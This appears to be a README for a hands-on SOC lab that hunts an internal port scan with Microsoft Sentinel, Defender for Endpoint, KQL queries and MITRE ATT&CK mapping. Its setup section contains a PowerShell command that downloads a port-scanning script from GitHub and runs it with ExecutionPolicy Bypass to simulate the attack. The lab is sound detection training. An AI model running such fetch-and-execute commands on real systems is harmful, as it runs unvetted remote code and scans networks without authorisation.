@@ -1,0 +1,236 @@
+# 🔍 Internal Port Scan Detection — Threat Hunting Scenario
+
+**Tools Used:** Microsoft Sentinel · Microsoft Defender for Endpoint · Azure Virtual Machines · KQL · Log Analytics Workspace · MITRE ATT&CK Framework  
+**Frameworks:** Threat Hunting Methodology · MITRE ATT&CK  
+**Skills Demonstrated:** Proactive Threat Hunting · Network Anomaly Detection · KQL Query Writing · Log Correlation · Process & File Event Analysis
+
+---
+
+## 📋 Overview
+
+The server team reported significant **network performance degradation** on older devices attached to the internal `10.0.0.0/16` network. After ruling out an external DDoS attack, the security team launched a proactive threat hunt to determine whether the slowdown was caused by internal activity — such as large file downloads or internal port scanning.
+
+This scenario follows a structured **7-phase threat hunting methodology** and maps findings to the **MITRE ATT&CK Framework**.
+
+---
+
+## 🔧 Pre-Lab Setup
+
+Before beginning, the following were provisioned and confirmed operational:
+
+- ✅ Azure Virtual Machine created and onboarded to **Microsoft Defender for Endpoint (MDE)**
+- ✅ The following PowerShell command was executed on the VM to simulate malicious port scanning activity:
+
+```powershell
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
+```
+
+- ✅ Logs confirmed flowing into Log Analytics Workspace from:
+  - `DeviceNetworkEvents`
+  - `DeviceFileEvents`
+  - `DeviceProcessEvents`
+
+> 📸 **Screenshot:** *Azure portal showing VM running + MDE device inventory confirmation*
+
+---
+
+## Phase 1 — Preparation
+
+### Hypothesis
+
+> *"Could an internal host be conducting port scanning against other devices on the 10.0.0.0/16 network, causing the observed performance degradation?"*
+
+**Environment Context:**
+- All traffic originating from within the local network is **allowed by default** across all hosts
+- There are **no restrictions** on PowerShell or application execution in the environment
+- This creates an opportunity for an internal host to conduct port scanning or large file transfers undetected
+
+**Potential MITRE ATT&CK TTPs to investigate:**
+- T1046 — Network Service Discovery (Port Scanning)
+- T1059.001 — Command and Scripting Interpreter: PowerShell
+
+---
+
+## Phase 2 — Data Collection
+
+### Objective
+Confirm that relevant log sources are populated and available for analysis.
+
+**Tables verified:**
+
+| Table | Purpose |
+|---|---|
+| `DeviceNetworkEvents` | Network connections — successful and failed |
+| `DeviceFileEvents` | File creation, modification, deletion |
+| `DeviceProcessEvents` | Process execution and command-line activity |
+
+> 📸 **Screenshot:** *KQL query confirming recent logs exist in DeviceNetworkEvents*
+
+---
+
+## Phase 3 — Data Analysis
+
+### Objective
+Identify anomalies and patterns in network activity that support or refute the hypothesis.
+
+**Step 1 — Count failed connections by device to spot outliers:**
+
+```kql
+DeviceNetworkEvents
+| where ActionType == "ConnectionFailed"
+| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP
+| order by FailedConnectionsAttempts desc
+```
+
+> 📸 **Screenshot:** *Query results showing devices with unusually high failed connection counts*
+
+**Step 2 — Isolate the suspicious IP and confirm volume:**
+
+```kql
+let IPInQuestion = "10.0.0.5"; // Replace with your suspicious IP
+DeviceNetworkEvents
+| where ActionType == "ConnectionFailed"
+| where LocalIP == IPInQuestion
+| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP
+| order by FailedConnectionsAttempts desc
+```
+
+> 📸 **Screenshot:** *Aggregated failed connection count for the suspect IP*
+
+**Step 3 — Review the raw connection attempts for the flagged IP:**
+
+```kql
+let IPInQuestion = "10.0.0.5"; // Replace with your suspicious IP
+DeviceNetworkEvents
+| where ActionType == "ConnectionFailed"
+| where LocalIP == IPInQuestion
+| order by Timestamp desc
+```
+
+**Findings:** A single internal IP was responsible for a massive volume of failed connection attempts across sequential ports and hosts — consistent with automated port scanning behavior.
+
+> 📸 **Screenshot:** *Raw DeviceNetworkEvents log showing rapid sequential failed connections from suspect IP*
+
+---
+
+## Phase 4 — Investigation
+
+### Objective
+Pivot from network anomalies to process and file events to identify root cause.
+
+**Step 4 — Correlate with process events around the time of suspicious activity:**
+
+```kql
+let VMName = "windows-target-"; // Replace with your VM name
+let specificTime = datetime(2024-10-18T04:09:37.5180794Z); // Replace with your timestamp
+DeviceProcessEvents
+| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
+| where DeviceName == VMName
+| order by Timestamp desc
+| project Timestamp, FileName, InitiatingProcessCommandLine
+```
+
+> 📸 **Screenshot:** *DeviceProcessEvents results showing PowerShell execution with suspicious command-line arguments near the time of network anomaly*
+
+**Findings:**
+- PowerShell was executed on the affected host around the same time the port scanning activity began
+- The `InitiatingProcessCommandLine` revealed execution of a downloaded `.ps1` script (`portscan.ps1`) from `C:\programdata\`
+- This confirms the network degradation was caused by **intentional internal port scanning via a PowerShell script**
+
+**MITRE ATT&CK Mapping:**
+
+| Technique | ID | Evidence |
+|---|---|---|
+| Network Service Discovery | T1046 | Sequential failed connections across the subnet |
+| PowerShell Execution | T1059.001 | portscan.ps1 executed via bypass policy |
+| Ingress Tool Transfer | T1105 | Script downloaded via Invoke-WebRequest |
+
+> 📸 **Screenshot:** *MITRE ATT&CK Navigator or framework reference showing mapped techniques*
+
+---
+
+## Phase 5 — Response
+
+### Objective
+Contain and mitigate the confirmed threat.
+
+**Actions taken / recommended:**
+
+- 🔒 **Isolate the affected host** via Microsoft Defender for Endpoint if active threat is confirmed
+- 🚫 **Block PowerShell execution** for non-administrative users via AppLocker or Defender Attack Surface Reduction (ASR) rules
+- 🗑️ **Remove malicious script** — delete `C:\programdata\portscan.ps1` from the host
+- 🔍 **Review other hosts** on the `10.0.0.0/16` subnet for similar indicators
+
+> 📸 **Screenshot:** *MDE device page showing isolation option or ASR rule configuration*
+
+---
+
+## Phase 6 — Documentation
+
+### Findings Summary
+
+- **Root Cause:** A PowerShell port scanning script (`portscan.ps1`) was downloaded and executed on an internal VM, generating thousands of failed connection attempts across the `10.0.0.0/16` subnet
+- **Impact:** Significant network performance degradation on older devices caused by scanning traffic volume
+- **Affected Host:** `windows-target-1` (IP: `10.0.0.5`)
+- **Attack Vector:** Unrestricted PowerShell execution + no internal network segmentation controls
+- **Outcome:** No confirmed data exfiltration or lateral movement; threat contained
+
+> 📸 **Screenshot:** *Incident notes or documentation panel with findings recorded*
+
+---
+
+## Phase 7 — Improvement
+
+### Lessons Learned & Recommendations
+
+| Gap Identified | Recommended Control |
+|---|---|
+| Unrestricted PowerShell execution | Enforce Constrained Language Mode or ASR rules |
+| No internal network segmentation | Implement host-based firewall rules or NSG policies |
+| Scripts downloadable via web requests | Block Invoke-WebRequest to untrusted domains via proxy |
+| No alerting on internal port scanning | Build Sentinel rule to alert on high-volume internal failed connections |
+
+**Proposed Detection Rule (Future):**
+A Sentinel Scheduled Query Rule could be created using the failed connection aggregation query to automatically alert when any internal IP exceeds a threshold of failed connections within a short window — turning this reactive hunt into a proactive detection.
+
+---
+
+## 🗂️ Summary
+
+| Phase | Action Taken |
+|---|---|
+| Preparation | Hypothesis formed around internal port scanning causing network degradation |
+| Data Collection | Verified logs in DeviceNetworkEvents, DeviceFileEvents, DeviceProcessEvents |
+| Data Analysis | Identified single internal IP with massive failed connection volume |
+| Investigation | Correlated with PowerShell process events; confirmed portscan.ps1 execution |
+| Response | Isolation recommended; script removal and PowerShell restrictions proposed |
+| Documentation | Findings, IOCs, and MITRE mappings recorded |
+| Improvement | Detection rule and hardening recommendations documented |
+
+---
+
+## 📁 Repository Structure
+
+```
+02-Internal-Port-Scan-Detection/
+│
+├── README.md                         ← This file
+├── screenshots/
+│   ├── 01-vm-mde-onboarding.png
+│   ├── 02-logs-confirmed-tables.png
+│   ├── 03-failed-connections-summary.png
+│   ├── 04-suspect-ip-aggregated.png
+│   ├── 05-raw-failed-connections.png
+│   ├── 06-process-events-powershell.png
+│   ├── 07-mitre-attack-mapping.png
+│   ├── 08-response-actions.png
+│   └── 09-findings-documented.png
+└── queries/
+    ├── failed_connections_summary.kql
+    ├── suspect_ip_connections.kql
+    └── process_events_correlation.kql
+```
+
+---
+
+*Part of the [Threat-Hunting-Scenarios](../README.md) repository — a collection of hands-on SOC labs following real-world detection and response workflows.*
